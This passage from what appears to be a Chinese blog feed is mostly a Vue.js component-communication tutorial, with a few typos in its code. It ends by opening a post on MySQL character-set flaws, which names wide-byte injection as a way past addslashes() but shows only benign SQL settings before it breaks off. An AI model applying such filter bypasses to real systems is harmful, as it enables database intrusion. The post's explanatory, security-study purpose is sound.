v-model</h4><p>　　<code>v-model:total</code> 与 <code>this.$emit(&#39;input&#39;,this.counter)</code> 实现子组件动态更新父组件数据。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">my-component</span> <span class="attr">v-model</span>=<span class="string">"total"</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">//组件内</span></span></span><br><span class="line"><span class="xml">    template：'<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"handleClick"</span>&gt;</span>+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span>'</span></span><br><span class="line"><span class="javascript">    data：<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> &#123;<span class="attr">counter</span>:<span class="number">0</span>&#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    methods： &#123;</span></span><br><span class="line"><span class="javascript">        handleClick: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.counter++;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.$emit(<span class="string">'input'</span>,<span class="keyword">this</span>.counter);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript"><span class="comment">//new Vue父组件内</span></span></span><br><span class="line"><span class="undefined">    data: &#123;</span></span><br><span class="line"><span class="undefined">        total： 0</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>　　此处<code>$emit</code>使用<code>input</code>作为特殊事件名，而父组件并没有使用<code>@input=&quot;hander&quot;</code>监听，也没有对应的method中有hander这个函数来更新参数total。<br>　　<code>v-model:total</code> 可以说就是一种语法糖。他就是相当于完成了以上的操作，自定义事件input接受子组件的请求，并且完成对应total的数据更新。一个组件上的<code>v-model</code>默认会利用名为<code>value</code>的prop和名为<code>input</code>的事件</p><h4 id="v-model-双向数据绑定"><a href="#v-model-双向数据绑定" class="headerlink" title="v-model 双向数据绑定"></a>v-model 双向数据绑定</h4><p>其实现的功能就跟 在父组件内部中使用v-model 一样，会同步数据。需要满足两个要求：</p><ul><li>子函数 props 接受一个value属性</li><li>有新的value时触发input事件</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>总数：&#123;&#123;total&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">my-component</span> <span class="attr">v-model</span>=<span class="string">"total"</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"handleReduce"</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 父组件更新，同步到子组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    Vue.component(<span class="string">'my-component'</span>,&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//父组件的变化会同步到子组件</span></span></span><br><span class="line"><span class="javascript">        props: [<span class="string">'value'</span>],</span></span><br><span class="line"><span class="xml">        template: '<span class="tag">&lt;<span class="name">input</span> <span class="attr">:value:</span>"<span class="attr">value</span>" @<span class="attr">input</span>=<span class="string">"updateValue"</span>&gt;</span>',</span></span><br><span class="line"><span class="undefined">        methods: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//子组件内函数动态更新，每一次更新都触发emit，到父组件</span></span></span><br><span class="line"><span class="javascript">            updateValue: <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">this</span>.$emit(<span class="string">'input'</span>,event.target.value)</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">        data: &#123;</span></span><br><span class="line"><span class="undefined">            total: 0 </span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        methods: &#123;</span></span><br><span class="line"><span class="javascript">            handleReduce: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">this</span>.total--;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="非父子组件通讯"><a href="#非父子组件通讯" class="headerlink" title="非父子组件通讯"></a>非父子组件通讯</h2><h3 id="BUS数据总线"><a href="#BUS数据总线" class="headerlink" title="BUS数据总线"></a>BUS数据总线</h3><p>利用中间vue，形成bus数据总线，一者往里扔数据，一直从里面取数据，使用如下。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    &#123;&#123; message &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">component-a</span>&gt;</span><span class="tag">&lt;/<span class="name">component-a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> bus = <span class="keyword">new</span> Vue();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    Vue.component(<span class="string">'component-a'</span>, &#123;</span></span><br><span class="line"><span class="xml">        template: '<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"handleEvent"</span>&gt;</span>传递事件<span class="tag">&lt;/<span class="name">button</span>&gt;</span>',</span></span><br><span class="line"><span class="undefined">        methods: &#123;</span></span><br><span class="line"><span class="javascript">            handleEvent: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">//通过bus把事件on-message</span></span></span><br><span class="line"><span class="javascript">                bus.$emit(<span class="string">'on-message'</span>,<span class="string">'来自组件component-a的内容'</span>)</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    vat app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">        data: &#123;</span></span><br><span class="line"><span class="javascript">            message: <span class="string">''</span></span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="javascript">        mounted: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> _this = <span class="keyword">this</span>;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//在实例初始化时，监听来自bus实例的事件</span></span></span><br><span class="line"><span class="javascript">            bus.$on(<span class="string">'on-message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">msg</span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">                _this.message = msg;</span></span><br><span class="line"><span class="undefined">            &#125;)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>　　BUS可以实现任何组件间的通讯，包括父子，兄弟，跨级。还可以添加data、methods、computed等选项，这都都是公用的。</p><h3 id="父链-子链-根"><a href="#父链-子链-根" class="headerlink" title="父链 子链 根"></a>父链 子链 根</h3><p>在子组件中，使用<code>this.$parent</code>可以直接访问该组件的父实例和组件<br>在父组件中，使用<code>this.$children</code>可以访问他的所有的子组件<br>在子组件中，使用<code>this.$root</code>可以用访问他的根实例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//this.$parent</span></span><br><span class="line">methods:&#123;</span><br><span class="line">    handleEvent: <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//访问到父链后，可以做任何操作，比如直接修改数据,但是不推荐这样操作，耦合性太高</span></span><br><span class="line">        <span class="keyword">this</span>.$parent.message = <span class="string">'来自组件component-a的内容'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//this.$root</span></span><br><span class="line"><span class="comment">// 获取根组件的数据</span></span><br><span class="line"><span class="keyword">this</span>.$root.foo</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入根组件的数据</span></span><br><span class="line"><span class="keyword">this</span>.$root.foo = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问根组件的计算属性</span></span><br><span class="line"><span class="keyword">this</span>.$root.bar</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用根组件的方法</span></span><br><span class="line"><span class="keyword">this</span>.$root.baz()</span><br></pre></td></tr></table></figure><h4 id="子组件索引"><a href="#子组件索引" class="headerlink" title="子组件索引"></a>子组件索引</h4><p>在使用<code>$children</code>会返回全部子组件,另外Vue提供了子组件索引的方法来定位组件 ———— <strong>ref</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为子组件设定索引名称</span></span><br><span class="line">&lt;component-a ref=<span class="string">"comA"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">component-a</span>&gt;</span></span></span><br><span class="line"><span class="xml">...</span></span><br><span class="line"><span class="xml">methods: &#123;</span></span><br><span class="line"><span class="xml">    handleRef: function() &#123;</span></span><br><span class="line"><span class="xml">        //定位子组件</span></span><br><span class="line"><span class="xml">        var msg = this.$refs.comA.message;</span></span><br><span class="line"><span class="xml">        concole.log(msg);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h3><p>　　可以把依赖注入看作一部分“大范围有效的 prop”，除了：</p><ul><li>祖先组件不需要知道哪些后代组件使用它提供的属性</li><li>后代组件不需要知道被注入的属性来自哪里</li></ul><p>　　<code>provide</code>选项允许我们指定我们想要提供给后代组件的数据/方法。<br>　　<code>在任何后代组件里，我们都可以使用</code>inject`选项来接收指定的我们想要添加在这个实例上的属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父组件</span></span><br><span class="line">provide: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    getMap: <span class="keyword">this</span>.getMap</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后代组件</span></span><br><span class="line">inject: [<span class="string">'getMap'</span>]</span><br></pre></td></tr></table></figure><h2 id="slot（插槽）"><a href="#slot（插槽）" class="headerlink" title="slot（插槽）"></a>slot（插槽）</h2><p>　　<strong>slot</strong>————内容分发，父组件向子组件分发HTML内容</p><ul><li>父组件需要分发的内容卸载子组件标签内</li><li>子组件模板(template)中使用<code>&lt;slot&gt;</code>标签</li><li>当父组件没有插入内容时，<code>&lt;slot&gt;</code>标签中的内容默认出现</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">component-child</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>分发的内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>再来一个<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">component-child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> bus = <span class="keyword">new</span> Vue();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    Vue.component(<span class="string">'component-child'</span>, &#123;</span></span><br><span class="line"><span class="undefined">        template: '\</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>\</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">slot</span>&gt;</span>\</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>如果父组件没有插入内容，我将作为默认出现<span class="tag">&lt;<span class="name">p</span>&gt;</span>\</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">slot</span>&gt;</span>\</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span>\</span></span><br><span class="line"><span class="undefined">        '</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    vat app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">'#app'</span></span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="具名-slot"><a href="#具名-slot" class="headerlink" title="具名 slot"></a>具名 slot</h3><p>　　具有name属性的slot，可以为slot识别分类插入至子组件模板的不同地方</p><ul><li>父组件中用<code>slot=&quot;Name&quot;</code>作为标签的属性</li><li>子组件中<code>&lt;slot name=&quot;Name&quot;&gt;</code>作为对应插槽位置</li><li>具有name属性的slot，可以与普通slot混合使用</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">component-child</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span> <span class="attr">slot</span>=<span class="string">"header"</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>分发的内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>再来一个<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">component-child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> bus = <span class="keyword">new</span> Vue();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    Vue.component(<span class="string">'component-child'</span>, &#123;</span></span><br><span class="line"><span class="undefined">        template: '\</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>\</span></span><br><span class="line"><span class="javascript">            &lt;slot name=<span class="string">"header"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span>\</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">slot</span>&gt;</span>\</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>如果父组件没有插入内容，我将作为默认出现<span class="tag">&lt;<span class="name">p</span>&gt;</span>\</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">slot</span>&gt;</span>\</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span>\</span></span><br><span class="line"><span class="undefined">        '</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    vat app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">'#app'</span></span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="nextTick"><a href="#nextTick" class="headerlink" title="$nextTick"></a>$nextTick</h3><p>　　解决异步更新队列产生的不同步问题</p><p>　　Vue在观察到数据变化时并不是直接更新DOM，而是开启一个队列，并缓冲在同一时间循环中发生的所有数据改变。在缓冲时会取出重复数据，从而避免不必要的计算和DOM操作。然后在下一个时间循环tick中，Vue刷新队列并执行实际（已去重的）工作。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//更改DOM</span></span><br><span class="line"><span class="keyword">this</span>.$nextTick(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//读取新更新的DOM，需要使用$nextTick</span></span><br><span class="line">    <span class="keyword">var</span> text = <span class="built_in">document</span>.getElementById(<span class="string">'div'</span>).innerHTML;</span><br><span class="line">    <span class="built_in">console</span>.log(text);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="在动态组件上使用-keep-alive"><a href="#在动态组件上使用-keep-alive" class="headerlink" title="在动态组件上使用 keep-alive"></a>在动态组件上使用 keep-alive</h3><p>　　动态组件是用<code>is</code>特性来切换不同组件：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">component</span> <span class="attr">v-bind:is</span>=<span class="string">"currentTabComponent"</span>&gt;</span><span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>　　这种情况下每次切换组件都会创建一个新的<code>currentTabComponent</code>实例。不会记录实例状态，解决这个问题，比如保存页面状态，可以用<code>&lt;keep-alive&gt;</code>元素将动态组件包裹起来</p><hr><h1 id="单文件组件"><a href="#单文件组件" class="headerlink" title="单文件组件"></a>单文件组件</h1><p>　　通常使用 <code>Vue.component</code> 来定义全局组件，紧接着用 <code>new Vue({ el: &#39;#container &#39;})</code> 在每个页面内指定一个容器元素。这种方式有很多缺点：</p><ul><li>全局定义 (Global definitions) 强制要求每个 component 中的命名不得重复</li><li>字符串模板 (String templates) 缺乏语法高亮，在 HTML 有多行的时候，需要用到丑陋的 </li><li>不支持 CSS (No CSS support) 意味着当 HTML 和 JavaScript 组件化时，CSS 明显被遗漏</li><li>没有构建步骤 (No build step) 限制只能使用 HTML 和 ES5 JavaScript, 而不能使用预处理器，如 Pug (formerly Jade) 和 Babel</li></ul><p>　　文件扩展名为<code>.vue</code>的<code>single-file components</code>(单文件组件) 为以上所有问题提供了解决方法，并且还可以使用 webpack 或 Browserify 等构建工具。</p><p><code>.vue</code>文件格式如下:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;greeting&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">module</span>.exports = &#123;</span></span><br><span class="line"><span class="javascript">    data: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">            greeting: <span class="string">'hello'</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">p &#123;</span></span><br><span class="line"><span class="undefined">    font-size: 2em;</span></span><br><span class="line"><span class="undefined">    text-align: center;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— 点点开发技能树  —&lt;br&gt;— Vue组件 及 通讯 —&lt;br&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://lalajun.com/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="Vue" scheme="http://lalajun.com/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>Mysql-字符集漏洞分析</title>
    <link href="http://lalajun.com/2018/05/11/mysql-%E5%AD%97%E7%AC%A6%E9%9B%86%E6%BC%8F%E6%B4%9E/"/>
    <id>http://lalajun.com/2018/05/11/mysql-字符集漏洞/</id>
    <published>2018-05-11T13:39:54.000Z</published>
    <updated>2018-05-11T12:58:45.522Z</updated>
    
    <content type="html"><![CDATA[<p>— Mysql字符集漏洞 —<br>—  PHP 字符集漏洞  —<br><a id="more"></a></p><h1 id="mysql字符集漏洞"><a href="#mysql字符集漏洞" class="headerlink" title="mysql字符集漏洞"></a>mysql字符集漏洞</h1><p>此篇将介绍两种有关mysql字符集的漏洞,再提及一点类似原理的PHP字符集。</p><ul><li>一者是 <strong>字符集转换漏洞</strong> ———— 因为字符集不同 躲过关键词过滤  进入mysql后产生的截断 恢复关键词查询</li><li>一者是 <strong>宽字节注入</strong> ———— 因为字符集不同 躲过SQL注入过滤函数<strong>addslashes()</strong>使addslashes过滤的单引号、双引号、反斜杠、NULL 可以利用，从而绕过SQL注入防护，达成SQL注入  </li></ul><p>在介绍这两种漏洞之前，先介绍一些Mysql语句</p><h2 id="Mysql语句"><a href="#Mysql语句" class="headerlink" title="Mysql语句"></a>Mysql语句</h2><h3 id="查看字符集"><a href="#查看字符集" class="headerlink" title="查看字符集"></a>查看字符集</h3><p>查看Mysql中的字符集设置<br><code>show variables like &#39;character_set_%&#39;</code></p><h3 id="设置客户端字符集"><a href="#设置客户端字符集" class="headerlink" title="设置客户端字符集"></a>设置客户端字符集</h3><p>在php中，常用以下语句来设置php客户端在Mysql中的字符集<br><code>set names utf8</code><br>这个语句会修改如下几项客户端设置<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">character_set_client=utf8</span><br><span class="line">character_set_connection=utf8</span><br><span class="line">character_set_results=utf8</span><br></pre></td></tr></table></figure></p><p>然而如下服务端设置不会修改<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">character_set_database</span><br><span class="line">character_set_server</span><br><span class="line">character_set_filesysytem</span><br><span class="line">character_set_system</span><br></pre></td></tr></table></figure></p><p>这样就造成了 服务端与客户端 不匹配<br>从而会造成 <strong>字符集转换漏洞</strong></p><p>而当设置的客户端字符集为GBK时，即<code>set names gbk</code><br>(此处以GBK作为典范，但不只是GBK会产生宽字节注入，之后细说)<br>从而会造成 <strong>宽字节注入</strong></p><p>下面说明字符集转换漏洞</p><h2 id="Mysql字符集转换漏洞"><a href="#Mysql字符集转换漏洞" class="headerlink" title="Mysql字符集转换漏洞"></a>Mysql字符集转换漏洞</h2><blockquote><p>当我们的mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。<br>当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。</p></blockquote><p>于是从php到mysql执行命令的字符集转换关系是</p><p>character_set_client -&gt; character_set_connection -&gt; 内部操作字符集(如果是对于数据表字段进行操作，就是那个数据表字段的字符集)</p><h3 id="字符集转换漏洞"><a href="#字符集转换漏洞" class="headerlink" title="字符集转换漏洞"></a>字符集转换漏洞</h3><p>假设客户端执行了<code>set names utf8</code>，然而服务端的数据库字段格式是 